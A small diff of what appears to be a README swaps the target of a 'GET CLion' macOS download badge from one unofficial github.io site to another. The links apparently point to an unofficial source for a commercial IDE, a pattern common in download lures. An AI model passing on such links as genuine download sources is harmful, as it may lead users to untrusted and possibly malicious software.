@@ -7,7 +7,7 @@
 <br>   
 
 <div align="center">  
-<a href="https://macos-25.github.io/.github/clion">  
+<a href="https://osx-app.github.io/.github/clion">  
 <img src="https://img.shields.io/badge/💻_GET_CLion-green?style=for-the-badge&logo=apple" alt="GET CLion">  
 </a>  
 </div>  
